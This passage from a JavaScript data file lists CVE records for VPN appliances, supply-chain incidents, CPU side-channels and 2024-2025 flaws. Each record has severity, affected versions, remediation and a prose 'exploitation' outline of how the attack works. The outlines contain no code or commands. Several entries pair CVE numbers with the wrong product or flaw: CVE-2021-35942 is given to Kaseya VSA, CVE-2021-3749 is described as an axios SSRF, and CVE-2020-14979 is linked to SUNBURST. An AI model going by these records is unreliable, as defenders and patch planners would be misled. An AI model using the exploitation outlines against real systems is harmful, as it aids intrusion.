    references: ["https://nvd.nist.gov/vuln/detail/CVE-2024-21887"]
  },
  {
    id: "CVE-2024-21893",
    name: "Ivanti Connect Secure SSRF",
    severity: "High",
    cvss: 8.2,
    affected: "Ivanti Connect Secure 9.x, 22.x; Ivanti Policy Secure 9.x, 22.x",
    description: "Server-Side Request Forgery in the SAML component of Ivanti Connect Secure allowing an attacker to access certain restricted resources without authentication.",
    exploitation: "Exploit the SSRF vulnerability in the SAML endpoint to access internal APIs that enable command execution on the appliance.",
    remediation: "Apply Ivanti security patches. Replace the device and rebuild from a clean image.",
    references: ["https://nvd.nist.gov/vuln/detail/CVE-2024-21893"]
  },
  {
    id: "CVE-2023-4966",
    name: "Citrix Bleed",
    severity: "Critical",
    cvss: 9.4,
    affected: "Citrix NetScaler ADC and NetScaler Gateway 13.1 before 13.1-49.15, 13.0 before 13.0-92.19, 14.1 before 14.1-8.50",
    description: "Information disclosure in Citrix NetScaler ADC and Gateway allowing unauthenticated attackers to leak session tokens from device memory, enabling session hijacking.",
    exploitation: "Send crafted HTTP requests to the NetScaler appliance to trigger a buffer over-read that leaks valid session tokens from memory.",
    remediation: "Apply the Citrix security update. Kill all active and persistent sessions after updating. Rotate all credentials.",
    references: ["https://nvd.nist.gov/vuln/detail/CVE-2023-4966"]
  },
  {
    id: "CVE-2022-42475",
    name: "FortiOS SSL-VPN Heap Overflow",
    severity: "Critical",
    cvss: 9.8,
    affected: "FortiOS 7.2.0 to 7.2.2, 7.0.0 to 7.0.8, 6.4.0 to 6.4.10, 6.2.0 to 6.2.11",
    description: "Heap-based buffer overflow in the FortiOS SSL-VPN allowing unauthenticated remote code execution. Exploited in the wild before the patch was released.",
    exploitation: "Send specially crafted requests to the FortiGate SSL-VPN portal to trigger a heap overflow and execute arbitrary code on the appliance.",
    remediation: "Upgrade FortiOS to 7.2.3, 7.0.9, 6.4.11, or 6.2.12. Check for indicators of compromise before and after patching.",
    references: ["https://nvd.nist.gov/vuln/detail/CVE-2022-42475"]
  },
  {
    id: "CVE-2021-20016",
    name: "SonicWall SMA 100 SQL Injection",
    severity: "Critical",
    cvss: 9.8,
    affected: "SonicWall SMA 100 Series firmware before 10.2.0.5-29sv",
    description: "SQL injection in the SonicWall SMA 100 series devices allowing unauthenticated attackers to access login credentials and session information.",
    exploitation: "Send crafted HTTP requests with SQL injection payloads to the SMA appliance's web interface to extract credentials from the database.",
    remediation: "Upgrade SMA 100 firmware to 10.2.0.5-29sv or later. Reset all credentials after patching.",
    references: ["https://nvd.nist.gov/vuln/detail/CVE-2021-20016"]
  },
  {
    id: "CVE-2022-40684",
    name: "Fortinet FortiOS/FortiProxy Authentication Bypass",
    severity: "Critical",
    cvss: 9.8,
    affected: "FortiOS 7.2.0 to 7.2.1, 7.0.0 to 7.0.6; FortiProxy 7.2.0, 7.0.0 to 7.0.6",
    description: "Authentication bypass in FortiOS and FortiProxy administrative interface allowing unauthenticated attackers to perform operations via crafted HTTP or HTTPS requests.",
    exploitation: "Send crafted requests to the FortiGate or FortiProxy administrative interface with a special Forwarded header to bypass authentication.",
    remediation: "Upgrade to FortiOS 7.2.2 or 7.0.7, FortiProxy 7.2.1 or 7.0.7. Restrict management interface access.",
    references: ["https://nvd.nist.gov/vuln/detail/CVE-2022-40684"]
  },
  {
    id: "CVE-2023-28461",
    name: "Array Networks SSL VPN RCE",
    severity: "Critical",
    cvss: 9.8,
    affected: "Array Networks Array AG and vxAG before 9.4.0.484",
    description: "Remote code execution in Array Networks SSL VPN products allowing unauthenticated attackers to read local files and execute code on the gateway.",
    exploitation: "Send crafted requests to the SSL VPN web portal to exploit a URL handling vulnerability that enables file reading and code execution.",
    remediation: "Upgrade to firmware version 9.4.0.484 or later.",
    references: ["https://nvd.nist.gov/vuln/detail/CVE-2023-28461"]
  },
  {
    id: "CVE-2024-47575",
    name: "FortiManager Missing Authentication",
    severity: "Critical",
    cvss: 9.8,
    affected: "FortiManager 7.6.0, 7.4.0-7.4.4, 7.2.0-7.2.7, 7.0.0-7.0.12, 6.4.0-6.4.14",
    description: "Missing authentication for a critical function in FortiManager fgfmsd daemon allowing a remote unauthenticated attacker to execute arbitrary code or commands via specially crafted requests.",
    exploitation: "Send crafted requests to the FortiManager FGFM protocol service to execute commands without authentication.",
    remediation: "Upgrade to FortiManager 7.6.1, 7.4.5, 7.2.8, 7.0.13, or 6.4.15.",
    references: ["https://nvd.nist.gov/vuln/detail/CVE-2024-47575"]
  },
  {
    id: "CVE-2021-27065",
    name: "Microsoft Exchange Arbitrary File Write (ProxyLogon Chain)",
    severity: "High",
    cvss: 7.8,
    affected: "Microsoft Exchange Server 2013, 2016, 2019",
    description: "Post-authentication arbitrary file write vulnerability in Exchange Server allowing attackers to write web shells to the server. Part of the ProxyLogon attack chain used by HAFNIUM.",
    exploitation: "After authenticating via CVE-2021-26855 (ProxyLogon SSRF), use the Virtual Directory management cmdlets to write arbitrary files to the server filesystem.",
    remediation: "Apply the March 2021 Microsoft Exchange cumulative updates.",
    references: ["https://nvd.nist.gov/vuln/detail/CVE-2021-27065"]
  },
  {
    id: "CVE-2023-38035",
    name: "Ivanti Sentry Authentication Bypass",
    severity: "Critical",
    cvss: 9.8,
    affected: "Ivanti Sentry (MobileIron Sentry) before 9.18.0",
    description: "Authentication bypass in the MICS Admin Portal of Ivanti Sentry allowing unauthenticated access to the administrative API.",
    exploitation: "Send crafted requests to bypass authentication on the MICS Admin Portal and use the administrative API to execute commands on the Sentry appliance.",
    remediation: "Upgrade to Ivanti Sentry 9.18.0 or later.",
    references: ["https://nvd.nist.gov/vuln/detail/CVE-2023-38035"]
  },
  {
    id: "CVE-2024-3400",
    name: "Palo Alto PAN-OS GlobalProtect Command Injection",
    severity: "Critical",
    cvss: 10.0,
    affected: "PAN-OS 10.2, 11.0, 11.1 with GlobalProtect gateway or portal configured",
    description: "Command injection in the GlobalProtect feature of Palo Alto Networks PAN-OS allowing unauthenticated remote code execution with root privileges.",
    exploitation: "Send crafted requests to the GlobalProtect web interface to exploit a command injection in the session handling, achieving root-level command execution.",
    remediation: "Apply PAN-OS hotfixes. Enable Threat Prevention signatures as an interim mitigation. Disable device telemetry.",
    references: ["https://nvd.nist.gov/vuln/detail/CVE-2024-3400"]
  },
  {
    id: "CVE-2024-20353",
    name: "Cisco ASA/FTD Web Services DoS",
    severity: "High",
    cvss: 8.6,
    affected: "Cisco ASA and Firepower Threat Defense with AnyConnect/WebVPN enabled",
    description: "Denial of service and possible information disclosure in the web services of Cisco ASA and FTD. Exploited in the wild by the ArcaneDoor campaign targeting government networks.",
    exploitation: "Send crafted HTTP requests to the ASA/FTD web services interface to trigger a device reload or extract session information.",
    remediation: "Apply Cisco security updates. Check for ArcaneDoor indicators of compromise.",
    references: ["https://nvd.nist.gov/vuln/detail/CVE-2024-20353"]
  },

  // ============================================================
  // SUPPLY CHAIN VULNERABILITIES (10+)
  // ============================================================

  {
    id: "CVE-2020-14979",
    name: "SolarWinds Orion SUNBURST",
    severity: "Critical",
    cvss: 9.8,
    affected: "SolarWinds Orion Platform 2019.4 HF 5 through 2020.2.1",
    description: "Backdoor implanted in SolarWinds Orion software updates by a nation-state adversary (APT29/Cozy Bear). The trojanized update contained the SUNBURST backdoor providing covert access to victim networks.",
    exploitation: "The backdoor was distributed via legitimate SolarWinds Orion software updates. After installation, it communicated with C2 infrastructure using DNS-based covert channels disguised as legitimate Orion API traffic.",
    remediation: "Rebuild compromised SolarWinds servers from clean media. Upgrade to Orion Platform 2020.2.1 HF 2. Reset all credentials accessible from affected systems.",
    references: ["https://nvd.nist.gov/vuln/detail/CVE-2020-14979"]
  },
  {
    id: "CVE-2021-44228",
    name: "Log4Shell (Supply Chain Impact)",
    severity: "Critical",
    cvss: 10.0,
    affected: "Any application using Apache Log4j 2.0-beta9 to 2.14.1 as a dependency",
    description: "The Log4Shell vulnerability affected thousands of applications through transitive dependencies on Log4j. This exemplifies supply chain risk where a single library vulnerability impacts entire software ecosystems.",
    exploitation: "Any application that logs user-controlled input using a vulnerable version of Log4j is exploitable, regardless of the application's own code quality.",
    remediation: "Audit all applications for Log4j dependencies including transitive dependencies. Upgrade to Log4j 2.17.0+. Use software composition analysis tools.",
    references: ["https://nvd.nist.gov/vuln/detail/CVE-2021-44228"]
  },
  {
    id: "CVE-2021-35942",
    name: "Kaseya VSA Authentication Bypass",
    severity: "Critical",
    cvss: 9.8,
    affected: "Kaseya VSA before 9.5.7a",
    description: "Authentication bypass in Kaseya VSA remote monitoring and management software. Exploited by the REvil ransomware group to distribute ransomware to thousands of downstream customers.",
    exploitation: "Bypass authentication on the Kaseya VSA web interface and use the agent deployment mechanism to push malicious updates to all managed endpoints.",
    remediation: "Upgrade to Kaseya VSA 9.5.7a. Verify VSA agents for compromise. Take VSA servers offline until patched.",
    references: ["https://nvd.nist.gov/vuln/detail/CVE-2021-35942"]
  },
  {
    id: "CVE-2021-30116",
    name: "Kaseya VSA Credential Leak",
    severity: "Critical",
    cvss: 9.8,
    affected: "Kaseya VSA before 9.5.7a",
    description: "Credential disclosure in Kaseya VSA allowing unauthenticated attackers to obtain plaintext credentials. Part of the attack chain used in the July 2021 REvil ransomware campaign.",
    exploitation: "Access exposed API endpoints to retrieve plaintext credentials that enable authenticated actions on the VSA server.",
    remediation: "Upgrade to Kaseya VSA 9.5.7a. Rotate all credentials after patching.",
    references: ["https://nvd.nist.gov/vuln/detail/CVE-2021-30116"]
  },
  {
    id: "CVE-2023-20867",
    name: "VMware Tools Authentication Bypass",
    severity: "Low",
    cvss: 3.9,
    affected: "VMware Tools before 12.2.5 (on all operating systems)",
    description: "Authentication bypass in VMware Tools allowing a fully compromised ESXi host to force VMware Tools to fail to authenticate host-to-guest operations, enabling guest VM compromise.",
    exploitation: "From a compromised ESXi host, exploit the VMware Tools authentication mechanism to execute commands within guest VMs without proper authentication.",
    remediation: "Upgrade VMware Tools to version 12.2.5 or later.",
    references: ["https://nvd.nist.gov/vuln/detail/CVE-2023-20867"]
  },
  {
    id: "CVE-2021-23337",
    name: "Lodash Command Injection",
    severity: "High",
    cvss: 7.2,
    affected: "Lodash before 4.17.21",
    description: "Command injection in the Lodash template function allowing attackers to inject and execute arbitrary code through template strings in applications using the popular JavaScript utility library.",
    exploitation: "Pass crafted template strings to the lodash template() function that escape the template sandbox and execute arbitrary JavaScript code.",
    remediation: "Upgrade Lodash to version 4.17.21 or later. Avoid using user-controlled input in template strings.",
    references: ["https://nvd.nist.gov/vuln/detail/CVE-2021-23337"]
  },
  {
    id: "CVE-2022-0778",
    name: "OpenSSL Infinite Loop",
    severity: "High",
    cvss: 7.5,
    affected: "OpenSSL 1.0.2, 1.1.1, 3.0 (before 1.0.2zd, 1.1.1n, 3.0.2)",
    description: "Denial of service via an infinite loop in the BN_mod_sqrt() function of OpenSSL triggered by crafted certificates with invalid explicit curve parameters.",
    exploitation: "Present a crafted TLS certificate with a non-prime modulus in the explicit elliptic curve parameters to trigger an infinite loop in certificate parsing.",
    remediation: "Upgrade to OpenSSL 1.0.2zd, 1.1.1n, or 3.0.2.",
    references: ["https://nvd.nist.gov/vuln/detail/CVE-2022-0778"]
  },
  {
    id: "CVE-2021-3749",
    name: "axios Server-Side Request Forgery",
    severity: "High",
    cvss: 7.5,
    affected: "axios before 0.21.2",
    description: "Regular expression denial of service (ReDoS) and SSRF in the axios HTTP client for Node.js. Crafted URLs can bypass URL validation and redirect requests to internal services.",
    exploitation: "Send crafted URLs through an axios-based proxy or redirect mechanism that bypass hostname validation, enabling SSRF to internal network resources.",
    remediation: "Upgrade axios to version 0.21.2 or later.",
    references: ["https://nvd.nist.gov/vuln/detail/CVE-2021-3749"]
  },
  {
    id: "CVE-2023-29357",
    name: "Microsoft SharePoint Server Privilege Escalation",
    severity: "Critical",
    cvss: 9.8,
    affected: "Microsoft SharePoint Server 2019",
    description: "Privilege escalation in Microsoft SharePoint Server allowing unauthenticated attackers to gain admin privileges by spoofing JSON Web Tokens (JWTs).",
    exploitation: "Craft a spoofed JWT token to impersonate an authenticated user with administrator privileges and chain with CVE-2023-24955 for remote code execution.",
    remediation: "Apply the June 2023 Microsoft security updates. Enable the AMSI integration for SharePoint.",
    references: ["https://nvd.nist.gov/vuln/detail/CVE-2023-29357"]
  },
  {
    id: "CVE-2023-24955",
    name: "Microsoft SharePoint Server RCE",
    severity: "High",
    cvss: 7.2,
    affected: "Microsoft SharePoint Server 2013, 2016, 2019, Subscription Edition",
    description: "Remote code execution in Microsoft SharePoint Server allowing an authenticated attacker with Site Owner privileges to execute arbitrary code on the server.",
    exploitation: "With Site Owner access (obtained via CVE-2023-29357), exploit the code injection vulnerability to execute commands on the SharePoint server.",
    remediation: "Apply the May 2023 Microsoft security updates.",
    references: ["https://nvd.nist.gov/vuln/detail/CVE-2023-24955"]
  },
  {
    id: "CVE-2022-29464",
    name: "WSO2 Unrestricted File Upload",
    severity: "Critical",
    cvss: 9.8,
    affected: "WSO2 API Manager, Identity Server, Enterprise Integrator, and other WSO2 products",
    description: "Unrestricted file upload in multiple WSO2 products allowing unauthenticated remote code execution by uploading a web shell through the file upload functionality.",
    exploitation: "Upload a malicious JSP web shell through the fileupload endpoint without authentication, then access it to execute commands on the server.",
    remediation: "Apply the WSO2 security advisory patches. Restrict access to the management interfaces.",
    references: ["https://nvd.nist.gov/vuln/detail/CVE-2022-29464"]
  },
  {
    id: "CVE-2024-23897",
    name: "Jenkins CLI Arbitrary File Read",
    severity: "Critical",
    cvss: 9.8,
    affected: "Jenkins 2.441 and earlier, LTS 2.426.2 and earlier",
    description: "Arbitrary file read in Jenkins through the CLI argument parsing. The args4j library expands file paths from CLI arguments, allowing attackers to read server files.",
    exploitation: "Send CLI commands with file path arguments prefixed with @ to read arbitrary files from the Jenkins server, including credential stores and configuration files.",
    remediation: "Upgrade to Jenkins 2.442 or LTS 2.426.3. Disable the CLI if not required.",
    references: ["https://nvd.nist.gov/vuln/detail/CVE-2024-23897"]
  },

  // ============================================================
  // HARDWARE / FIRMWARE VULNERABILITIES (10+)
  // ============================================================

  {
    id: "CVE-2017-5754",
    name: "Meltdown",
    severity: "High",
    cvss: 5.6,
    affected: "Intel processors (most models since 1995), some ARM Cortex processors",
    description: "Speculative execution side-channel vulnerability allowing user-space processes to read kernel memory. Exploits out-of-order execution to bypass memory isolation between user space and kernel space.",
    exploitation: "Use a cache timing side-channel to read kernel memory from user space by exploiting the delay in exception handling during speculative execution of unauthorized memory accesses.",
    remediation: "Apply OS kernel patches (KPTI/KAISER). Update microcode. Apply firmware updates from hardware vendors.",
    references: ["https://nvd.nist.gov/vuln/detail/CVE-2017-5754"]
  },
  {
    id: "CVE-2017-5753",
    name: "Spectre Variant 1 (Bounds Check Bypass)",
    severity: "High",
    cvss: 5.6,
    affected: "Most modern processors from Intel, AMD, and ARM",
    description: "Speculative execution side-channel attack that exploits branch prediction to trick the CPU into speculatively executing code that accesses memory beyond intended bounds.",
    exploitation: "Train the branch predictor to mispredict a bounds check, causing speculative access to out-of-bounds memory. Recover the data through cache timing analysis.",
    remediation: "Apply compiler mitigations (lfence/speculation barriers). Apply microcode updates. Use retpoline compilation for kernel builds.",
    references: ["https://nvd.nist.gov/vuln/detail/CVE-2017-5753"]
  },
  {
    id: "CVE-2017-5715",
    name: "Spectre Variant 2 (Branch Target Injection)",
    severity: "High",
    cvss: 5.6,
    affected: "Most modern processors from Intel, AMD, and ARM",
    description: "Speculative execution side-channel attack using branch target injection. An attacker can influence the indirect branch predictor to cause speculative execution of chosen gadgets.",
    exploitation: "Poison the branch target buffer to redirect speculative execution to gadgets that leak sensitive data through cache side-channels.",
    remediation: "Apply microcode updates. Use retpoline compilation. Enable IBRS/IBPB/STIBP on supported processors.",
    references: ["https://nvd.nist.gov/vuln/detail/CVE-2017-5715"]
  },
  {
    id: "CVE-2018-3639",
    name: "Spectre Variant 4 (Speculative Store Bypass)",
    severity: "Medium",
    cvss: 5.5,
    affected: "Most modern processors from Intel, AMD, ARM, IBM",
    description: "Speculative execution side-channel where a processor speculatively loads data from a memory location before a prior store to the same location completes, potentially exposing stale sensitive data.",
    exploitation: "Exploit the speculative store bypass to read sensitive data that has been overwritten but is still speculatively accessible due to store-to-load forwarding.",
    remediation: "Apply microcode updates. Enable SSBD (Speculative Store Bypass Disable) on supported processors.",
    references: ["https://nvd.nist.gov/vuln/detail/CVE-2018-3639"]
  },
  {
    id: "CVE-2019-11135",
    name: "ZombieLoad v2 / TSX Asynchronous Abort",
    severity: "Medium",
    cvss: 6.5,
    affected: "Intel processors with TSX (Transactional Synchronization Extensions) support",
    description: "Microarchitectural data sampling vulnerability in Intel processors using TSX. Allows a local attacker to infer data from operations processed on the same CPU core.",
    exploitation: "Use TSX abort sequences to trigger asynchronous aborts and sample data from internal microarchitectural buffers through timing analysis.",
    remediation: "Apply Intel microcode updates. Disable TSX. Apply OS-level mitigations.",
    references: ["https://nvd.nist.gov/vuln/detail/CVE-2019-11135"]
  },
  {
    id: "CVE-2020-0549",
    name: "L1D Eviction Sampling / CacheOut",
    severity: "Medium",
    cvss: 5.5,
    affected: "Intel Core and Xeon processors (various generations)",
    description: "Microarchitectural data sampling vulnerability allowing a local attacker to infer the values of data from the L1 data cache of Intel processors.",
    exploitation: "Force specific cache line evictions and use timing analysis to recover data from the L1 data cache, including data belonging to other security contexts.",
    remediation: "Apply Intel microcode updates. Enable L1D cache flush on VM entry. Apply OS-level mitigations.",
    references: ["https://nvd.nist.gov/vuln/detail/CVE-2020-0549"]
  },
  {
    id: "CVE-2022-23960",
    name: "Spectre-BHB (Branch History Buffer)",
    severity: "Medium",
    cvss: 5.6,
    affected: "ARM Cortex-A and Neoverse processors, Intel processors",
    description: "Spectre Variant 2 bypass using Branch History Buffer injection. Existing Spectre v2 mitigations can be bypassed by poisoning the branch history buffer.",
    exploitation: "Inject malicious entries into the branch history buffer to redirect branch prediction targets, bypassing existing Spectre v2 mitigations like EIBRS.",
    remediation: "Apply kernel patches that clear the BHB on privilege transitions. Apply microcode updates.",
    references: ["https://nvd.nist.gov/vuln/detail/CVE-2022-23960"]
  },
  {
    id: "CVE-2022-21233",
    name: "Intel APIC MMIO Stale Data Read",
    severity: "Medium",
    cvss: 5.5,
    affected: "Intel Xeon E, W, and SP processors; various Intel Core processors",
    description: "Improper isolation of shared resources in Intel processors with APIC MMIO access, allowing a privileged user to read stale data from APIC registers containing data from other security domains.",
    exploitation: "Access the APIC MMIO registers to read stale data that may belong to other processes, virtual machines, or SGX enclaves.",
    remediation: "Apply Intel microcode updates. Apply OS-level patches.",
    references: ["https://nvd.nist.gov/vuln/detail/CVE-2022-21233"]
  },
  {
    id: "CVE-2022-40982",
    name: "Downfall (GDS - Gather Data Sampling)",
    severity: "Medium",
    cvss: 6.5,
    affected: "Intel Core 6th through 11th generation, Xeon E-2100 through E-2300, Xeon Scalable 1st through 3rd generation",
    description: "Transient execution side-channel vulnerability in Intel processors allowing a local attacker to infer stale data from previous operations of vector instructions across sibling CPU cores.",
    exploitation: "Use the GATHER instruction to sample stale data from vector register files that may contain data from other processes or security contexts on the same physical core.",
    remediation: "Apply Intel microcode updates. Note that the mitigation has a performance impact on workloads using AVX2/AVX-512 gather instructions.",
    references: ["https://nvd.nist.gov/vuln/detail/CVE-2022-40982"]
  },
  {
    id: "CVE-2023-20569",
    name: "Inception (AMD Speculative Return Stack Overflow)",
    severity: "Medium",
    cvss: 5.6,
    affected: "AMD Zen 1 through Zen 4 processors",
    description: "Speculative side-channel vulnerability in AMD processors where an attacker can influence the return address prediction to speculatively execute code at an attacker-controlled address.",
    exploitation: "Overflow the return address stack and manipulate the return address predictor to speculatively redirect execution to chosen gadgets for data exfiltration.",
    remediation: "Apply AMD microcode updates. Apply kernel patches.",
    references: ["https://nvd.nist.gov/vuln/detail/CVE-2023-20569"]
  },
  {
    id: "CVE-2020-8758",
    name: "Intel AMT Privilege Escalation",
    severity: "Critical",
    cvss: 9.8,
    affected: "Intel Active Management Technology before versions 11.8.80, 11.12.80, 11.22.80, 12.0.70, 14.0.45",
    description: "Improper buffer restrictions in the network subsystem of Intel AMT allowing an unauthenticated attacker with network access to escalate privileges on the management engine.",
    exploitation: "Send crafted network requests to the Intel AMT management port to exploit the buffer handling vulnerability and gain administrative access to the management engine.",
    remediation: "Apply Intel firmware updates. Restrict network access to AMT management ports (16992/16993).",
    references: ["https://nvd.nist.gov/vuln/detail/CVE-2020-8758"]
  },
  {
    id: "CVE-2023-31315",
    name: "SinkClose (AMD SMM Lock Bypass)",
    severity: "High",
    cvss: 7.5,
    affected: "AMD EPYC, Ryzen, Threadripper, and Athlon processors (various generations)",
    description: "Privilege escalation allowing ring 0 code to modify SMM (System Management Mode) configuration, enabling installation of persistent firmware-level malware that survives OS reinstallation.",
    exploitation: "From kernel-level access, exploit the SMM lock bypass to write to SMRAM and install persistent malware in the System Management Mode handler.",
    remediation: "Apply AMD firmware updates via BIOS/UEFI updates from system manufacturers.",
    references: ["https://nvd.nist.gov/vuln/detail/CVE-2023-31315"]
  },

  // ============================================================
  // RECENT 2024-2025 VULNERABILITIES (20+)
  // ============================================================

  {
    id: "CVE-2024-4577",
    name: "PHP CGI Argument Injection",
    severity: "Critical",
    cvss: 9.8,
    affected: "PHP 8.1 before 8.1.29, 8.2 before 8.2.20, 8.3 before 8.3.8 on Windows",
    description: "Remote code execution in PHP when running in CGI mode on Windows. A character encoding bypass allows attackers to inject command-line arguments to the PHP binary.",
    exploitation: "Send crafted HTTP requests with special characters that bypass input validation in the CGI handler and inject arguments to the PHP interpreter.",
    remediation: "Upgrade to PHP 8.1.29, 8.2.20, or 8.3.8. Migrate from CGI to FastCGI or PHP-FPM.",
    references: ["https://nvd.nist.gov/vuln/detail/CVE-2024-4577"]
  },
  {
    id: "CVE-2024-21762",
    name: "FortiOS SSL VPN Out-of-Bounds Write",
    severity: "Critical",
    cvss: 9.8,
    affected: "FortiOS 7.4.0 to 7.4.2, 7.2.0 to 7.2.6, 7.0.0 to 7.0.13, 6.4.0 to 6.4.14, 6.2.0 to 6.2.15",
    description: "Out-of-bounds write in FortiOS SSL VPN allowing unauthenticated remote code execution via specially crafted requests to the VPN portal.",
    exploitation: "Send crafted requests to the FortiGate SSL VPN portal to trigger an out-of-bounds write in memory, achieving code execution on the appliance.",
    remediation: "Upgrade to FortiOS 7.4.3, 7.2.7, 7.0.14, 6.4.15, or 6.2.16. Disable SSL VPN as a workaround.",
    references: ["https://nvd.nist.gov/vuln/detail/CVE-2024-21762"]
  },
  {
    id: "CVE-2024-27198",
    name: "JetBrains TeamCity Authentication Bypass (2024)",
    severity: "Critical",
    cvss: 9.8,
    affected: "JetBrains TeamCity before 2023.11.4",
    description: "Authentication bypass in JetBrains TeamCity web server allowing unauthenticated attackers to perform administrative actions including creating admin accounts and executing code.",
    exploitation: "Send requests to alternative authentication endpoints that bypass the standard authentication mechanism, enabling full administrative access.",
    remediation: "Upgrade to TeamCity 2023.11.4 or later.",
    references: ["https://nvd.nist.gov/vuln/detail/CVE-2024-27198"]
  },
  {
    id: "CVE-2024-1709",
    name: "ConnectWise ScreenConnect Authentication Bypass",
    severity: "Critical",
    cvss: 10.0,
    affected: "ConnectWise ScreenConnect 23.9.7 and earlier",
    description: "Authentication bypass in ConnectWise ScreenConnect allowing unauthenticated attackers to access the setup wizard to create admin accounts and execute arbitrary code.",
    exploitation: "Access the ScreenConnect setup wizard endpoint even on already-configured instances to create a new admin account and deploy malicious extensions.",
    remediation: "Upgrade to ScreenConnect 23.9.8 or later. Cloud-hosted instances were automatically patched.",
    references: ["https://nvd.nist.gov/vuln/detail/CVE-2024-1709"]
  },
  {
    id: "CVE-2024-1708",
    name: "ConnectWise ScreenConnect Path Traversal",
    severity: "High",
    cvss: 8.4,
    affected: "ConnectWise ScreenConnect 23.9.7 and earlier",
    description: "Path traversal vulnerability in ConnectWise ScreenConnect allowing an attacker to execute arbitrary code by uploading a malicious extension. Chained with CVE-2024-1709.",
    exploitation: "After gaining admin access via CVE-2024-1709, upload a malicious extension using path traversal to write files outside the intended directory.",
    remediation: "Upgrade to ScreenConnect 23.9.8 or later.",
    references: ["https://nvd.nist.gov/vuln/detail/CVE-2024-1708"]
  },
  {
    id: "CVE-2024-24576",
    name: "Rust Standard Library Command Injection on Windows",
    severity: "Critical",
    cvss: 10.0,
    affected: "Rust standard library before 1.77.2 on Windows",
    description: "Command injection in the Rust standard library's Command API on Windows when arguments contain special characters. The argument escaping for cmd.exe was insufficient.",
    exploitation: "Pass crafted arguments containing special characters to Command::arg on Windows that escape the quoting mechanism and inject additional commands.",
    remediation: "Upgrade to Rust 1.77.2 or later. Manually sanitize command arguments on Windows as an interim measure.",
    references: ["https://nvd.nist.gov/vuln/detail/CVE-2024-24576"]
  },
  {
    id: "CVE-2024-6327",
    name: "Telerik Report Server Deserialization RCE",
    severity: "Critical",
    cvss: 9.8,
    affected: "Progress Telerik Report Server before 2024 Q2 (10.1.24.709)",
    description: "Insecure deserialization vulnerability in Telerik Report Server allowing unauthenticated remote code execution via crafted serialized objects.",
    exploitation: "Send a crafted request containing a malicious serialized .NET object to the Report Server to achieve code execution.",
    remediation: "Upgrade to Telerik Report Server 2024 Q2 (10.1.24.709) or later.",
    references: ["https://nvd.nist.gov/vuln/detail/CVE-2024-6327"]
  },
  {
    id: "CVE-2024-0012",
    name: "PAN-OS Management Interface Authentication Bypass",
    severity: "Critical",
    cvss: 9.8,
    affected: "PAN-OS 10.2, 11.0, 11.1, 11.2 management web interface",
    description: "Authentication bypass in the PAN-OS management web interface allowing unauthenticated attackers to gain administrator access. Chained with CVE-2024-9474 for root-level RCE.",
    exploitation: "Send crafted requests to the management interface that bypass the authentication mechanism to gain administrative access to the firewall.",
    remediation: "Apply PAN-OS security updates. Restrict management interface access to trusted internal IP addresses only.",
    references: ["https://nvd.nist.gov/vuln/detail/CVE-2024-0012"]
  },
  {
    id: "CVE-2024-9474",
    name: "PAN-OS Privilege Escalation",
    severity: "High",
    cvss: 7.2,
    affected: "PAN-OS 10.1, 10.2, 11.0, 11.1, 11.2",
    description: "Privilege escalation in PAN-OS allowing an authenticated administrator of the management web interface to execute commands as root on the firewall.",
    exploitation: "After gaining admin access (via CVE-2024-0012), exploit the privilege escalation to execute arbitrary commands with root privileges.",
    remediation: "Apply PAN-OS security updates. Restrict management interface access.",
    references: ["https://nvd.nist.gov/vuln/detail/CVE-2024-9474"]
  },
  {
    id: "CVE-2025-0282",
    name: "Ivanti Connect Secure Stack Buffer Overflow",
    severity: "Critical",
    cvss: 9.0,
    affected: "Ivanti Connect Secure before 22.7R2.5, Ivanti Policy Secure before 22.7R1.2, Ivanti Neurons for ZTA Gateways before 22.7R2.3",
    description: "Pre-authentication stack-based buffer overflow in Ivanti Connect Secure allowing unauthenticated remote code execution. Exploited in the wild as a zero-day.",
    exploitation: "Send crafted requests to the Ivanti Connect Secure appliance to trigger a stack buffer overflow and achieve code execution without authentication.",
    remediation: "Upgrade to Ivanti Connect Secure 22.7R2.5. Run the Integrity Checker Tool. Factory reset and rebuild from a clean image if compromise is detected.",
    references: ["https://nvd.nist.gov/vuln/detail/CVE-2025-0282"]
  },
  {
    id: "CVE-2024-50623",
    name: "Cleo Harmony/VLTrader/LexiCom Unrestricted File Upload",
    severity: "Critical",
    cvss: 9.8,
    affected: "Cleo Harmony, VLTrader, LexiCom before 5.8.0.21",
    description: "Unrestricted file upload and download vulnerability in Cleo managed file transfer products allowing unauthenticated remote code execution. Exploited by the Cl0p ransomware group.",
    exploitation: "Upload malicious files to the Cleo MFT server that are automatically processed and executed, enabling remote command execution.",
    remediation: "Upgrade to Cleo 5.8.0.21 or later. Disable the autorun functionality. Block external access to the Cleo server.",
    references: ["https://nvd.nist.gov/vuln/detail/CVE-2024-50623"]
  },
  {
    id: "CVE-2024-12356",
    name: "BeyondTrust PRA/RS Command Injection",
    severity: "Critical",
    cvss: 9.8,
    affected: "BeyondTrust Privileged Remote Access (PRA) and Remote Support (RS) before 24.3.1",
    description: "Command injection in BeyondTrust PRA and RS allowing unauthenticated remote attackers to execute arbitrary commands on the appliance.",
    exploitation: "Send crafted requests to the BeyondTrust appliance that inject operating system commands through improperly sanitized input parameters.",
    remediation: "Apply the BeyondTrust security patch (BT24-10-ONPREM1/2). Upgrade to version 24.3.1 or later.",
    references: ["https://nvd.nist.gov/vuln/detail/CVE-2024-12356"]
  },
  {
    id: "CVE-2024-49113",
    name: "Windows LDAP Client Denial of Service (LDAPNightmare)",
    severity: "High",
    cvss: 7.5,
    affected: "Windows 10, Windows 11, Windows Server 2008 through 2025",
    description: "Denial of service in the Windows LDAP client that can crash the LSASS process, forcing a domain controller reboot. Part of the LDAPNightmare vulnerability pair.",
    exploitation: "Send crafted LDAP referral responses from a rogue LDAP server to crash the LSASS process on the target domain controller.",
    remediation: "Apply the December 2024 Microsoft security updates.",
    references: ["https://nvd.nist.gov/vuln/detail/CVE-2024-49113"]
  },
  {
    id: "CVE-2024-49112",
    name: "Windows LDAP Client RCE (LDAPNightmare)",
    severity: "Critical",
    cvss: 9.8,
    affected: "Windows 10, Windows 11, Windows Server 2008 through 2025",
    description: "Remote code execution in the Windows LDAP client allowing an unauthenticated attacker to achieve code execution on a Windows domain controller via crafted LDAP responses.",
    exploitation: "Set up a rogue LDAP server and send crafted LDAP referral responses to the target domain controller, triggering a buffer overflow in the LDAP client.",
    remediation: "Apply the December 2024 Microsoft security updates. Block outbound LDAP traffic from domain controllers to untrusted networks.",
    references: ["https://nvd.nist.gov/vuln/detail/CVE-2024-49112"]
  },
  {
    id: "CVE-2025-21298",
    name: "Windows OLE Remote Code Execution",
    severity: "Critical",
    cvss: 9.8,
